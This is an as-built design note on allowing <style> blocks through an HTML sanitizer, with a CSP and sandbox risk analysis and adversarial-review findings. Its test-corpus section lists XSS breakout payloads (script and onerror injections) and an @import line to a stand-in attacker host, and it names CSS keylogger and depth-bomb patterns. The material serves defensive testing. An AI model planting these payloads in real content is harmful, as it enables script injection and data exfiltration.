# Supporting `<style>` blocks — design note

**Status:** **BUILT (sanitizer v1.4).** `<style>` blocks are now allowed through the
sanitizer; this note is the as-built record of the change and the risk analysis behind
it. The verdict that justified shipping: under the render-time CSP + iframe sandbox,
allowing `<style>` blocks is **low marginal risk** — the classic CSS attacks all depend
on an external resource load that the CSP already forbids, and the one genuine residual
(in-frame visual spoofing) is *already possible today* via inline `style="…"`. The
posture shipped is **verbatim CSS passthrough** (rely on the CSP, do **not** add a CSS
parser), consistent with how inline styles are already handled. The change is small and
well-contained.

This note follows the shape of [`source-retention-design.md`](source-retention-design.md)
and [`byte-exact-publish-design.md`](byte-exact-publish-design.md): motivation → current
state → mechanism → risk → as-built changes → recommendation.

---

## 1. Motivation

Today every visual rule must live in an inline `style="…"` attribute — `<style>`
blocks are stripped (§3). An inline attribute is a single element's declaration
block; it has no selector context, so an entire class of CSS is unreachable:

- **`class`-driven theming** — no shared rule reused across many elements; every
  element repeats its full style string. A "design system" (color roles, a type
  scale, card/surface treatments) can't be expressed once and applied by class.
- **Pseudo-classes / pseudo-elements** — `:hover`, `:focus`, `::before`, `::after`,
  `::marker`. None can exist in an inline attribute.
- **`@media`** — no breakpoint-based responsive layout (responsiveness must be
  *intrinsic*: CSS grid `auto-fit`, `flex-wrap`, `max-width`, `clamp()`).
- **`@keyframes` + transitions** — no animation or motion layer.
- **`prefers-color-scheme`** — no author-controlled light/dark adaptation.
- **`@font-face` with `data:` fonts** — a custom font embedded as a `data:` URI
  (allowed by `font-src … data:`) needs an `@font-face` rule, which needs `<style>`.

Allowing `<style>` unlocks all of the above. **What stays impossible regardless**
(so expectations stay honest): no JavaScript (sandbox has no `allow-scripts`), no
real form controls (`<button>`/`<input>`/`<form>` are stripped — "buttons" are
styled `<a>` links; the only native interactivity is `<details>`/`<summary>` and
in-page `#anchor` links), and **no external images or fonts** (CSP blocks every
external origin). `<style>` is the *expressiveness* unlock for the static visual
language, not an interactivity or networking unlock.

## 2. Starting state (before v1.4)

- **`<style>` is stripped tag-and-content.** It sits in ammonia's default
  `clean_content_tags` blocklist `{script, style}` (verified against the vendored
  ammonia 4.1.2 source), so both the tag *and* its CSS text are removed. It is not
  in the tag allowlist (`make_builder()`, `sanitizer/src/lib.rs`). The module
  doc-comment names it explicitly as a deliberate strip (`sanitizer/src/lib.rs:27`).
- **Inline `style="…"` is already allowed** on any element (via ammonia defaults +
  the `style` entry in `SVG_GENERIC_ATTRS`). The sanitizer does **not** parse the CSS
  inside it — `url(javascript:…)` in an inline style survives sanitization *by
  design* and is neutralized at the render wall, not the sanitizer (this is already
  stated as an explicit non-guarantee in [`../security-model.md`](../security-model.md),
  "Inline-`style` CSS is not deep-parsed").
- **The render-time CSP already permits `<style>` blocks.** `RAW_CSP`
  (`src/serve.ts`, the policy on `GET /d/:id/raw`, the bytes the iframe loads) is:

  ```
  default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline' data:;
  font-src 'self' data:; frame-ancestors 'self'; base-uri 'none'; form-action 'none'
  ```

  `style-src 'unsafe-inline'` covers **both** inline `style="…"` attributes **and**
  `<style>` elements — so **allowing `<style>` requires no CSP change, ever.** The
  iframe `SANDBOX` (`src/serve.ts`) is `allow-popups allow-popups-to-escape-sandbox`
  — **no** `allow-scripts`, **no** `allow-same-origin`.
- **The Markdown text channel already drops CSS.** `html_to_markdown`
  (`sanitizer/src/markdown.rs:119`) emits nothing for `script | style | noscript`, so
  reading a `<style>`-bearing doc with `read_document format:"markdown"` (or `/text`)
  won't surface CSS as document text. No change needed there.

The net: the render wall is *already* configured for `<style>`; only the sanitizer
(Wall 2) removes it, as cheap insurance.

## 3. Mechanism (the recipe core)

**Ammonia change** — two calls in `make_builder()` (`sanitizer/src/lib.rs`):

1. Add `"style"` to the `EXTRA_TAGS` const (`sanitizer/src/lib.rs:60`), which flows
   into the existing `b.add_tags(extra)` at `sanitizer/src/lib.rs:125`.
2. Add, right after it: `b.rm_clean_content_tags(["style"]);`

**The gotcha — record this loudly.** Ammonia **panics at `clean()` time** if a tag
is present in *both* the allowlist and `clean_content_tags`. So `add_tags(["style"])`
**alone is a bug** — it would WASM-trap on the *first* `sanitize()` call (i.e. the
first write or test). The `rm_clean_content_tags(["style"])` is mandatory and must
accompany the `add_tags`. The order of the two calls within `make_builder()` doesn't
matter (the check runs at `clean()`, not at builder-config time), but both must be
present. **Verify fast:** `(cd sanitizer && cargo test keeps_inert_style_block)` —
the first surviving-`<style>` test that runs catches the panic immediately.

**Verbatim CSS passthrough (the chosen posture).** The CSS inside a surviving
`<style>` flows through **unparsed**. Defense against CSS-based vectors is the CSP +
sandbox (Wall 1), not the sanitizer — exactly the posture already in force for inline
`style="…"`. We **do not** add a CSS parser or a property allowlist: the project
deliberately avoids parsing CSS, and the egress/exfil vectors are already CSP-blocked
(§4), so a defensive CSS pass would be largely redundant scope. (The structural-CSS
alternative is the documented *deferred* mitigation — §6.)

**Raw-text breakout safety.** html5ever parses `<style>` as a **raw-text element**:
its content is tokenized as RAWTEXT and terminated only by the literal `</style>`.
Consequently a *parsed* `<style>` text node can never itself contain the substring
`</style>`. On re-serialization ammonia emits that text node verbatim between
`<style>…</style>`; because the node can't contain `</style>`, single-pass
serialization cannot be tricked into closing the element early and injecting markup
after it. Anything an author wrote *after* a `</style>` in the source was already
parsed as sibling content — and sanitized as such — before serialization. This is
why no second sanitize pass is needed; the corpus vectors in §6 prove it empirically.

## 4. Risk analysis (the honest part)

Walking each CSS attack class and why it is neutralized **here** (static doc, no
scripts, no inputs, strict CSP):

| Vector | Why it's dead here |
|---|---|
| Exfil via `background:url(//evil/…)` or attribute-selector keylogger (`input[value^="a"]{…}`) | Needs (a) an **external load** — `img-src 'self' data:` blocks it — **and** (b) a DOM secret / real `<input>` to leak — none survive sanitization. **Doubly dead.** And a published doc has nothing secret in its DOM. |
| `@import url(//evil/…)` of remote CSS | `style-src 'unsafe-inline' data:` lists **no external origin** (not even `'self'`). Blocked. |
| `@font-face { src: url(//evil/…) }` | `font-src 'self' data:` — no external origin. Blocked. (A `data:` font *is* allowed — that's the feature, self-contained, no egress.) |
| `:visited` history sniffing | Browsers neutered `:visited` styling years ago + no external load to observe. Dead. |
| IE `expression()` / old-Firefox `-moz-binding:url(…)` (the historical CSS→script vectors) | Removed from modern browsers; both also need an external load and there is no `allow-scripts`. Dead. |
| Resource exhaustion (pathological `@keyframes`, deeply nested selectors) | Client-side only (the viewer's own tab); bounded by the 5 MiB body cap. CSS is **not** parsed server-side (ammonia passes it through), so no server-side ReDoS surface. |

**The one genuine residual: CSS UI-redress / visual spoofing.** `position:fixed`
overlays, fake UI, `content:`-injected glyphs — a coordinated overlay that makes a
**forced outbound `<a>` link** look like a benign button. Two things bound it:

- It is **already possible today** with inline `style="…"` on a single large
  element. `<style>` makes *coordinated, multi-element* overlays **easier**, not
  **newly possible**. The capability delta is convenience, not kind.
- The render wall confines the damage: the iframe is sandboxed (no script, no
  same-origin) and `frame-ancestors 'self'` closes clickjacking *of* the document.
  The residual is purely **in-frame visual spoofing**, and navigation is the one
  egress the CSP can't close (a link the user chooses to click).

This is precisely the residual the **PLATFORM v2 spec already names and accepts** for
the full-CSS tier — see [`agent-knowledge-host-spec-PLATFORM-v2.md`](agent-knowledge-host-spec-PLATFORM-v2.md)
§6.7 ("CSS is allowed, with egress closed at the CSP layer"), which both closes the
egress vectors at the CSP and accepts the UI-redress overlay as a documented residual
"because the audience is private and principal-gated," to be revisited pre-public.
**Allowing `<style>` in SOLO converges toward the PLATFORM stance** rather than
diverging from it — the PLATFORM blueprint already contemplated "all CSS."

**Defense-in-depth note (the philosophical shift).** With `<style>` allowed, the
sanitizer stops being even "cheap insurance" for CSS — Wall 1 (CSP + sandbox) carries
the CSS threat model **entirely**. This is consistent with the *already-stated*
posture ([`../security-model.md`](../security-model.md): "CSS-based vectors are Wall
1's responsibility, not the sanitizer's"). `<style>` only widens the surface from
per-element inline declarations to document-level sheets with selectors — it does not
introduce a new trust boundary, and the bypass corpus's predicate is already scoped to
treat CSS *content* as out of scope (it checks the element tree for script-execution
sinks, not CSS values).

## 5. Why this is safe to ship as-is

- **No CSP change** — `style-src 'unsafe-inline'` already permits `<style>` (§2).
- **No new network surface** — `default-src 'none'` + `'self' data:` source lists
  already block every external load CSS can attempt (§4).
- **No script surface** — sandbox has no `allow-scripts`; CSS cannot execute JS in
  any modern browser.
- **No text-channel leak** — the Markdown projection already drops `<style>` (§2).
- **No mXSS via serialization** — html5ever raw-text handling makes a `</style>`
  breakout impossible in a single pass (§3), proven by the corpus vectors in §6.

## 6. Implementation (as built)

File-by-file, as shipped in sanitizer v1.4. Per `CLAUDE.md`'s same-commit sync rule,
the code and every doc below landed together. (Implementation detail: rather than fold
`"style"` into `EXTRA_TAGS`, the build added a dedicated `STYLESHEET_TAGS` const that is
both added to the tag allowlist and passed to `rm_clean_content_tags` — functionally
identical to the recipe below, and self-documenting about the two-step requirement.)

**Sanitizer (`sanitizer/src/lib.rs`).**
- Add `"style"` to `EXTRA_TAGS` (`:60`) and `b.rm_clean_content_tags(["style"]);`
  after `b.add_tags(extra)` (`:125`) — §3. Confirm the argument form compiles
  (`["style"]` vs `&["style"]` — match the ammonia doc-test signature).
- Bump `sanitizer_version()` (`:193`) → `"ammonia-v1.4"` with a comment-block line
  in the existing convention: *"v1.4 — allow `<style>` blocks: add `style` to the tag
  whitelist and lift it from ammonia's `clean_content_tags`; inert under sandbox +
  CSP, CSS is the render wall's responsibility (same as inline `style`)."*
- Drop the "`<style>` blocks — CSS-injection surface…" bullet from the module
  doc-comment (`:27`); optionally add a one-line note under "What we add on top of
  ammonia defaults."
- Rewrite the two stripping tests `strips_style_block_with_js_url` (`:683`) and
  `strips_style_block_with_import` (`:690`) into **survive-but-inert** tests:
  `keeps_inert_style_block` (a plain `<style>` + its CSS survive), and breakout
  proofs — `<style></style><script>…`, `<style>x{}</style><img src=x onerror=…>`,
  and a comment/CDATA close trick (`<style>/*</style>*/<img … onerror=…>`) — each
  asserting `<style>` survives but **no** `<script`/`onerror` does. Add a
  `contract_style_block_survives` pin in the publishing-contract test block so an
  ammonia upgrade that re-adds `style` to `clean_content_tags` fails loudly.

**Bypass corpus (`sanitizer/tests/bypass_corpus.rs` + `corpus/`).**
- Remove `"style"` from `DANGEROUS_TAGS` (`:84`) — a surviving inert `<style>` is no
  longer a sink and must not false-positive; a real `</style>` breakout still surfaces
  as a `script` element / `on*` attr, which the predicate still catches.
- Add a third "intentionally OUT of scope" bullet to the predicate scope-note:
  **`<style>`-block CSS content**, same rationale as inline `style` (CSP's job; the
  predicate inspects the element tree, not CSS text).
- Add an inert-`<style>` benign case to `predicate_self_check` so a future re-add of
  `style` to `DANGEROUS_TAGS` (which would re-introduce a false positive on
  legitimate output) trips the self-check.
- Append breakout/egress vectors to `corpus/bypasses.txt` (all must yield no live
  element/handler; the inert/egress ones survive as inert CSS):
  `<style></style><script>alert(1)</script>` ·
  `<style>x{}</style><img src=x onerror=alert(1)>` ·
  `<style>/*</style>*/<script>alert(1)</script>` ·
  `<style><![CDATA[</style><script>alert(1)</script>` ·
  `<svg><style>.a{}</style><script>alert(1)</script></svg>` ·
  `<math><style></style><script>alert(1)</script></math>` ·
  `<xmp></xmp><style></style><script>alert(1)</script>` ·
  `<style>@import url("https://attacker.example/leak.css");</style>` (survives inert)
  · `<style>*{position:fixed}</style><a href="https://attacker.example">x</a>`
  (survives inert — the named UI-redress residual). Note provenance in
  `corpus/SOURCES.md` (`awh-style-surface`, hand-authored probes of *our* allowance).

**Advisories (`src/advisories.ts` + `test/advisories.test.mjs`).**
- Delete the `<style>` `STRIPPED_RULES` entry (`src/advisories.ts:205`) — `<style>`
  no longer disappears, so the rule would never fire. Keep the adjacent
  `<link rel=stylesheet>` rule (external sheets are still stripped).
- Remove `"style"` from `SPECIFICALLY_COVERED` (`src/advisories.ts:170`); keep
  `"link"`. Keep `stripNoise`'s `<style>`-body strip (`src/advisories.ts:132`) — it
  still wants to avoid counting tag names inside CSS text.
- Swap the `<style>` example in the module doc-comment for a still-stripped one, and
  **fix the now-false `WILL_NOT_RENDER_RULES` comment** (it currently claims external
  CSS can't survive because `<style>`/`<link>` are stripped — untrue once `<style>`
  is allowed).
- **Add the external-CSS `will_not_render` advisory** (the chosen warning): a
  heuristic over the cleaned output —
  `match: /@import\b|url\(\s*['"]?https?:/i` — message that the iframe CSP
  (`style/img/font-src 'self' data:`) blocks the load, so inline the CSS or use a
  `data:` URL. CSS isn't parsed, so this is best-effort; false negatives acceptable.
- Update `test/advisories.test.mjs:19` (the "style stripped" case): replace with a
  **survive** case (`<style>` preserved → nothing reported stripped) plus a
  `will_not_render` case for `<style>@import url("https://…")</style>`.

**Render comment only (`src/serve.ts`).** `RAW_CSP` needs **no behavior change**;
correct the explanatory comment (it currently says the sanitizer strips `<style>`).

**Contract docs (same commit).**
- [`../../skills/publishing.md`](../../skills/publishing.md) "CSS rules" section — the
  biggest rewrite: TL;DR (`class`-driven theming etc. now possible) + the allowlist
  table (`<style>` **allowed**; `<link>` still **stripped**; `@import`/external
  `url()` survive but **CSP-blocked** → cross-ref the new advisory; `@font-face` with
  **`data:`** fonts now possible, external fonts blocked); flip the `<style>` line in
  the "stripped silently" example to a "works" example.
- [`../security-model.md`](../security-model.md) — remove `<style>` from the Wall 2
  strip list; extend the inline-`style` non-guarantee to cover `<style>` blocks; add
  one sentence on the UI-redress residual (forward-ref §6.7 + this note).
- [`agent-knowledge-host-spec-SOLO-v1.md`](agent-knowledge-host-spec-SOLO-v1.md) —
  light touch the sanitize-and-serve prose if any sentence asserts `<style>` is
  stripped; add a one-line as-built note. **PLATFORM v2 is frozen** — review only;
  SOLO converges toward §6.7, so no lineage edit is expected.
- `src/mcp.ts` — fix the "static-HTML non-negotiables" CSS line in the write-tool
  descriptions (currently "all styling must be INLINE…"; → "inline `style` **or**
  `<style>` blocks; external stylesheets/resources blocked"). Keep terse
  (non-negotiables-first; trimmed renders truncate the tail).
- `CLAUDE.md` — drop `<style>` from the sanitizer strip-list bullet; add `<style>` +
  **the panic-on-overlap gotcha** to the ammonia-defaults bullet; extend the
  bypass-corpus out-of-scope bullet.
- [`../http-api.md`](../http-api.md) — **no tag-list edit** (it delegates authoring
  rules to `publishing.md`).

**Slopcafe re-publish (when shipped).** Re-publish the changed mirrored docs via
`scripts/doc-web.mjs`: `slopcafe-publishing-guide` (`FLBUGmgWajRyjUl8NtHR7A`),
`slopcafe-security-model` (`Gc5xz_DS4Bb5Ie7CisZJcg`), `slopcafe-spec-solo` if edited,
and **this note** once its map entry is flipped public.

**Verification when shipped.** `(cd sanitizer && cargo test keeps_inert_style_block)`
first (catches the panic-on-overlap fast) → `npm run test:sanitizer` → `npm test` →
`npm run typecheck` → `npm run build:wasm` → `wrangler dev` E2E: publish an HTML doc
with a `<style>` block using `:hover` / `@media` / `@keyframes` / `prefers-color-scheme`,
load `/d/:id/raw`, confirm styles apply; publish one with `@import` + an external
`url(http…)` background and confirm devtools shows the fetch **CSP-blocked** and the
write response `will_not_render[]` flagged it; confirm a `data:` `@font-face` loads.

## 7. Recommendation & deferred

**Shipped with verbatim CSS passthrough** (§3): small, well-contained, no CSP change,
consistent with the existing inline-style posture, and it converges SOLO toward
PLATFORM §6.7.

**Deferred** — a **structural CSS allowlist / CSS property sanitizer** that could
forbid e.g. fixed-position overlays over interactive elements. This is the PLATFORM
§6.7 pre-public mitigation; it is genuine engineering (a markup sanitizer like ammonia
does not parse CSS property values structurally), explicitly **not** a cheap toggle,
and only matters once arbitrary strangers can be lured to a document. Until the threat
model widens to a public/adversarial audience, the UI-redress residual is **tracked
and accepted**, not closed — the same disposition PLATFORM §6.7 records.

## 8. Findings from the adversarial review

Shipping v1.4 was gated on a multi-agent adversarial pass (mXSS/RAWTEXT serialization,
SVG/MathML namespace confusion, CSP-exfiltration, and panic/DoS/read-path lenses), each
building a throwaway host harness and running the *real* sanitizer over dozens of vectors.

**Cleared (no breakout/exfil).** The core safety claim held empirically. The load-bearing
invariant: html5ever serializes a `<style>` text node **un-escaped** (RAWTEXT) *only* for an
**HTML-namespace** `<style>`, and the tokenizer guarantees such a node can never contain a
literal `</style>` — so single-pass serialization can't be tricked into an early close. An
SVG/MathML-namespaced `<style>` serializes **escaped**, and ammonia's `check_expected_namespace`
drops any element that switched namespace unexpectedly. Our allowlist has **zero MathML tags**
and denies `<foreignObject>`, which collapses the highest-value integration-point divergences
(e.g. `annotation-xml encoding="text/html"`) to the empty string. Under the exact `RAW_CSP`,
no `<style>`-borne external load or data-exfiltration channel exists (no external origin in any
directive; the doc is static with no secrets/inputs; `'self'`/`data:` carry no secret-derived
signal). The residual remains exactly the §4 in-frame UI-redress. New integration-point tripwire
vectors were added to `corpus/bypasses.txt` (`awh-style-surface`).

**Pre-existing issue surfaced (NOT a `<style>` regression): read-path converter recursion.**
`sanitizer/src/markdown.rs` recurses without a depth bound across **three** sites
(`Emitter::walk`/`walk_children`, `emit_svg`'s `search`, `collect_text`'s `walk`). A
pathologically deep DOM (e.g. `<div>`×80k — **no `<style>` needed**) passes `sanitize()`
(ammonia uses an explicit work-stack) and stays under the 5 MiB cap, but overflows the small
(~1 MiB) **WASM** stack at ~10k nesting (~110 KB input) and **hard-aborts the isolate**. It
fires at write time (the FTS-body `htmlToMarkdown`, before the D1 batch — so the doc is *not*
stored) and on every markdown read. Because the same converter runs at write, a depth-bomb can't
be *persisted* to crash other readers — the realistic impact is a write-time, self-inflicted,
authenticated, single-tenant request-level DoS (a hard abort, the worst failure mode). v1.4 only
*eases* hitting it (a compact `<svg><style>` nesting primitive); it does not introduce it.
**Disposition:** **ADDRESSED** ([GitHub issue #41](https://github.com/Skylled/slopcafe/issues/41),
separate commit) via the **reject-at-write** option. The write path now measures the sanitized
render's nesting depth with a new **iterative** (stack-safe) `max_dom_depth` and returns
`too_deep` (HTTP 422) past `MAX_DOM_DEPTH` (512) — *before* the recursive `htmlToMarkdown` ever
runs. So a depth-bomb can never reach the converter (at write) or storage (and thus never a read),
which closes the hard-abort for new documents; pre-existing docs are storable, hence already
below the overflow, so they read safely too. The alternative — bounding recursion in the converter
itself — was not taken: rejection is simpler and makes the depth-bomb a clean 422 instead of a
silent truncation. **Perf follow-up ([#42](https://github.com/Skylled/slopcafe/issues/42), separate
commit):** the precise `max_dom_depth` *and* `sanitize()` are themselves ~O(n²) in nesting (both
build + drop an html5ever/`RcDom` tree), so a near-byte-cap bomb still burned seconds before the
422 fired. A cheap O(n) byte-scan (`maxNestingDepth`, `src/depth.ts`) now runs **first** — on the
cheaply-converted HTML (pulldown-cmark is O(n)), *before* `sanitize()` — and refuses a bomb
~1000× faster (9 ms vs ~58 s at depth 50k); `max_dom_depth` stays the authoritative post-sanitize
guard, now always on shallow, pre-screened input. The `<select>`/`<noscript>` text-leak below was a
*separate* finding, addressed in turn (next).

**Pre-existing text-leak via parser-special containers — ADDRESSED (#41, sanitizer v1.5).**
In the `<select>` and `<noscript>` parser contexts, would-be-`<style>` content is parsed as plain
text (never a `<style>` element). Crucially the orphaned text ends up in **H itself** — so it's
*visible in the render*, not just the markdown/FTS channel (e.g. `<select><style>.x{color:red}
</style></select>` sanitized to the bare text `.x{color:red}`). The fix drops the **content** of
these non-allowed, parser-special containers (`<noscript>`/`<select>`/`<textarea>`) by adding them
to ammonia's `clean_content_tags` (`DROP_CONTENT_TAGS` in `make_builder`, joining the default
`script`), so their RAWTEXT/insertion-mode-mangled text can't survive as escaped/orphaned markup.
Non-security (render was H-only behind the CSP; the leak was visible-text/search pollution, not
XSS), but a real correctness wart. Bumped `sanitizer_version` → `ammonia-v1.5`.
